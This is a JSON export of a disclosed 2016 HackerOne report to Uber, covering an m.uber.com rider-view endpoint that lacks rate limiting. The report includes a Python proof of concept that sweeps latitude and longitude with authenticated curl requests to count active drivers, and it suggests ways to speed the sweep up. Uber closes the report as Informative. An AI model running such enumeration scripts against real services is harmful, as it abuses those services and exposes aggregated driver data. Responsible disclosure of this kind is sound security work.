{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "informative", 
    "bug_reporter_agreed_on_going_public_at": "2016-04-01T00:33:18.895Z", 
    "voters": [
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 127025, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-06-13T22:24:21.884Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Brute Forcing rider-view Endpoint Allows for Counting Number of Active Uber Drivers", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-05-01T00:33:19.395Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Informative", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-03-31T23:53:54.431Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-31T23:53:54.431Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @ddworken, can you clarify the difference between this and the regular `cn.uber.com`/RT-API endpoint? Does this endpoint let you hit it as often as you'd like while the other one does not? Thanks!", 
            "markdown_message": "<p>Hey <a href=\"/ddworken\">@ddworken</a>, can you clarify the difference between this and the regular <code>cn.uber.com</code>/RT-API endpoint? Does this endpoint let you hit it as often as you&#39;d like while the other one does not? Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 881104, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-01T00:02:20.115Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T00:02:20.115Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "So far I have not started to look into the ```cn.uber.com``` domain since I have not had a chance to patch the Uber app to remove SSL pinning (which is necessary in order to view the requests). I know that this endpoint lets me hit it as often as I want, but I have not tested any apis under ```cn.uber.com```. ", 
            "markdown_message": "<p>So far I have not started to look into the <code>cn.uber.com</code> domain since I have not had a chance to patch the Uber app to remove SSL pinning (which is necessary in order to view the requests). I know that this endpoint lets me hit it as often as I want, but I have not tested any apis under <code>cn.uber.com</code>. </p>\n", 
            "type": "Activities::Comment", 
            "id": 881112, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-01T00:13:47.140Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T00:13:47.140Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "I'm going to look into this one a bit to see how this compares to our regular endpoint for our mobile apps. Rate limiting on these types of endpoints can be very tricky because of the heavy use of NAT with mobile carriers (basically a lot of mobile devices sharing the same IP address) so sometimes we have no choice but to allow a large number of requests. Obviously we don't ever want to lock out our customers from using the app, so we have to be careful.", 
            "markdown_message": "<p>I&#39;m going to look into this one a bit to see how this compares to our regular endpoint for our mobile apps. Rate limiting on these types of endpoints can be very tricky because of the heavy use of NAT with mobile carriers (basically a lot of mobile devices sharing the same IP address) so sometimes we have no choice but to allow a large number of requests. Obviously we don&#39;t ever want to lock out our customers from using the app, so we have to be careful.</p>\n", 
            "type": "Activities::Comment", 
            "id": 881130, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-01T00:15:36.836Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T00:15:36.836Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Yeah, so rate limiting based off of IP may not work too well, but it might work to do rate limiting for each account. ", 
            "markdown_message": "<p>Yeah, so rate limiting based off of IP may not work too well, but it might work to do rate limiting for each account. </p>\n", 
            "type": "Activities::Comment", 
            "id": 881131, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-01T00:31:56.024Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T00:31:56.024Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "So, I've discussed this with some of my coworkers who have worked on this kind of thing previously. The short answer is that our rate limiting is quite complex and not always obvious. Due the to nuanced nature of this sort of thing we won't be taking reports on this particular subject (massive data analysis of our driver maps) but we appreciate you taking the time to submit this to us regardless. \n\nThese kinds of issues share some space with fraud where there's a lot that goes on behind the scenes which people don't see but is always working to protect the privacy of our drivers. However we can't really talk about all of it because then fraudsters would know how it works and could better evade it. Hope that all makes sense and for that reason I'm going to close this as `Informative`.\n\nThat being said I'll assign this task to myself so please let me know if you have any other questions on this! Appreciate you taking the time and please let us know if you find any other security issues.", 
            "markdown_message": "<p>So, I&#39;ve discussed this with some of my coworkers who have worked on this kind of thing previously. The short answer is that our rate limiting is quite complex and not always obvious. Due the to nuanced nature of this sort of thing we won&#39;t be taking reports on this particular subject (massive data analysis of our driver maps) but we appreciate you taking the time to submit this to us regardless. </p>\n\n<p>These kinds of issues share some space with fraud where there&#39;s a lot that goes on behind the scenes which people don&#39;t see but is always working to protect the privacy of our drivers. However we can&#39;t really talk about all of it because then fraudsters would know how it works and could better evade it. Hope that all makes sense and for that reason I&#39;m going to close this as <code>Informative</code>.</p>\n\n<p>That being said I&#39;ll assign this task to myself so please let me know if you have any other questions on this! Appreciate you taking the time and please let us know if you find any other security issues.</p>\n", 
            "type": "Activities::BugInformative", 
            "id": 881144, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-01T00:33:18.932Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T00:33:18.932Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "Ok, sounds good. \n\nThanks,\nDavid Dworken", 
            "markdown_message": "<p>Ok, sounds good. </p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 881145, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-12T14:37:02.278Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-12T14:37:02.278Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Can we please disclose this?\n\nThanks,\nDavid Dworken", 
            "markdown_message": "<p>Can we please disclose this?</p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
            "type": "Activities::Comment", 
            "id": 953295, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-13T22:24:21.943Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-13T22:24:21.943Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Sure thing!", 
            "markdown_message": "<p>Sure thing!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1012087, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-13T22:24:22.038Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-13T22:24:22.038Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1012088, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ddworken", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ddworken", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/344/b5a8712fba49a7d64be9cd1b3d0b50d4076edb42_small.png?1424388672"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -82073995.87849484, 
    "disclosed_at": "2016-06-13T22:24:22.010Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/127025", 
    "created_at": "2016-03-31T01:08:37.450Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>m.uber.com has an endpoint at <code>https://m.uber.com/proxy-rt/product/city/rider-view</code> that when called will return a list of nearby vehicles. By iterating through all latitudes and longitudes, it is possible to count the total number of active Uber drivers. </p>\n\n<p>The full URL to be called is <code>https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&amp;latitude=[INSERT HERE]&amp;longitude=[INSERT HERE]</code>. I used Google Chrome&#39;s &quot;Copy as curl&quot; function to generate the following PoC code: </p>\n<pre class=\"highlight python\"><code><span class=\"k\">for</span> <span class=\"n\">lat</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"o\">-</span><span class=\"mi\">180</span><span class=\"p\">,</span><span class=\"mi\">180</span><span class=\"p\">):</span>\n    <span class=\"k\">for</span> <span class=\"nb\">long</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"o\">-</span><span class=\"mi\">180</span><span class=\"p\">,</span><span class=\"mi\">180</span><span class=\"p\">):</span>\n        <span class=\"k\">try</span><span class=\"p\">:</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">json</span><span class=\"o\">.</span><span class=\"n\">loads</span><span class=\"p\">(</span><span class=\"n\">check_output</span><span class=\"p\">(</span><span class=\"s\">&quot;&quot;&quot;curl &#39;https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&amp;latitude=&quot;&quot;&quot;</span> <span class=\"o\">+</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">lat</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">&quot;&quot;&quot;&amp;longitude=&quot;&quot;&quot;</span> <span class=\"o\">+</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">long</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">&quot;&quot;&quot;&#39; -H &#39;Cookie: logged_in=true; _LOCALE_=en_US; muber-id=[REDACTED]; version=[REDACTED]; browser_error=false; __zlcmid=ZvfRKEKucjdr2c; utag_main=v_id:[REDACTED]$_sn:9$_ss:0$_st:1459385284209$segment:a$userid:[REDACTED]$flowtype:P2P$_pn:6</span><span class=\"si\">%3</span><span class=\"s\">Bexp-session$ses_id:[REDACTED]</span><span class=\"si\">%3</span><span class=\"s\">Bexp-session; vehicle-view-id=326; token=[REDACTED]; new-version=[REDACTED]</span><span class=\"si\">%0</span><span class=\"s\">A; analytics-counter=65; analytics-session=</span><span class=\"si\">%7</span><span class=\"s\">B</span><span class=\"si\">%22</span><span class=\"s\">session_id</span><span class=\"si\">%22%3</span><span class=\"s\">A</span><span class=\"si\">%227</span><span class=\"s\">A84C14D-5FF6-[REDACTED]</span><span class=\"si\">%22%2</span><span class=\"s\">C</span><span class=\"si\">%22</span><span class=\"s\">session_start_time_ms</span><span class=\"si\">%22%3</span><span class=\"s\">A1459382073947</span><span class=\"si\">%7</span><span class=\"s\">D&#39; -H &#39;X-Uber-Device-Language: en_US&#39; -H &#39;DNT: 1&#39; -H &#39;X-Uber-Token: [REDACTED]&#39; -H &#39;X-Uber-Origin: m.uber.com&#39; -H &#39;Accept-Encoding: gzip, deflate, sdch&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36&#39; -H &#39;Accept-Language: en-US,en;q=0.8&#39; -H &#39;Accept: */*&#39; -H &#39;X-Uber-Device: m.uber.com&#39; -H &#39;Referer: https://m.uber.com/&#39; -H &#39;X-Requested-With: XMLHttpRequest&#39; -H &#39;Connection: keep-alive&#39; -H &#39;X-Uber-Device-Id: m.uber.com&#39; --compressed&quot;&quot;&quot;</span><span class=\"p\">,</span> <span class=\"n\">shell</span><span class=\"o\">=</span><span class=\"bp\">True</span><span class=\"p\">))[</span><span class=\"s\">&#39;vehicleViewsOrder&#39;</span><span class=\"p\">]</span>\n        <span class=\"k\">except</span><span class=\"p\">:</span> <span class=\"k\">pass</span>\n        <span class=\"nb\">list</span> <span class=\"o\">+=</span> <span class=\"n\">t</span>\n<span class=\"k\">print</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"nb\">set</span><span class=\"p\">(</span><span class=\"nb\">list</span><span class=\"p\">)))</span>\n</code></pre>\n<p>I ran through 1/360th of the above code (total of 360 requests) in approximately 6 minutes. This code can quite easily be optimized in order to increase the speed and efficiency through: </p>\n\n<ol>\n<li>Checking only in areas where Uber is active</li>\n<li>Decreasing the size of the increment to <code>.1</code> instead of the current <code>1</code> to ensure we catch all Uber drivers</li>\n</ol>\n\n<p>In order to patch this you have to add rate limiting to this end point. </p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
    "vulnerability_information": "m.uber.com has an endpoint at ```https://m.uber.com/proxy-rt/product/city/rider-view``` that when called will return a list of nearby vehicles. By iterating through all latitudes and longitudes, it is possible to count the total number of active Uber drivers. \n\nThe full URL to be called is ```https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=[INSERT HERE]&longitude=[INSERT HERE]```. I used Google Chrome's \"Copy as curl\" function to generate the following PoC code: \n\n``` python\nfor lat in range(-180,180):\n    for long in range(-180,180):\n        try: t = json.loads(check_output(\"\"\"curl 'https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=\"\"\" + str(lat) + \"\"\"&longitude=\"\"\" + str(long) + \"\"\"' -H 'Cookie: logged_in=true; _LOCALE_=en_US; muber-id=[REDACTED]; version=[REDACTED]; browser_error=false; __zlcmid=ZvfRKEKucjdr2c; utag_main=v_id:[REDACTED]$_sn:9$_ss:0$_st:1459385284209$segment:a$userid:[REDACTED]$flowtype:P2P$_pn:6%3Bexp-session$ses_id:[REDACTED]%3Bexp-session; vehicle-view-id=326; token=[REDACTED]; new-version=[REDACTED]%0A; analytics-counter=65; analytics-session=%7B%22session_id%22%3A%227A84C14D-5FF6-[REDACTED]%22%2C%22session_start_time_ms%22%3A1459382073947%7D' -H 'X-Uber-Device-Language: en_US' -H 'DNT: 1' -H 'X-Uber-Token: [REDACTED]' -H 'X-Uber-Origin: m.uber.com' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36' -H 'Accept-Language: en-US,en;q=0.8' -H 'Accept: */*' -H 'X-Uber-Device: m.uber.com' -H 'Referer: https://m.uber.com/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'X-Uber-Device-Id: m.uber.com' --compressed\"\"\", shell=True))['vehicleViewsOrder']\n        except: pass\n        list += t\nprint len(list(set(list)))\n``` \n\nI ran through 1/360th of the above code (total of 360 requests) in approximately 6 minutes. This code can quite easily be optimized in order to increase the speed and efficiency through: \n\n1. Checking only in areas where Uber is active\n2. Decreasing the size of the increment to ```.1``` instead of the current ```1``` to ensure we catch all Uber drivers\n\nIn order to patch this you have to add rate limiting to this end point. \n\nThanks,\nDavid Dworken", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}